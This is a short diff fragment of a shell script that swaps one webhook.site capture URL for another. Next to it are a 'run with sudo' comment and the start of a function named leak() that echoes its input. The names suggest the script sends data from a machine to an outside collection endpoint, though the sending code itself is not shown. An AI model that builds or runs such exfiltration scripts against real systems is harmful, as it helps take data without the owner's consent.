@@ -2,7 +2,7 @@
 
 # XXX: run with sudo
 
-URL='https://webhook.site/65adb5dd-dc3e-4357-815b-fd42b2e2790d'
+URL='https://webhook.site/cda7d12b-a48b-4703-a02f-ef32abb61eff'
 
 leak() {
   echo "$1"
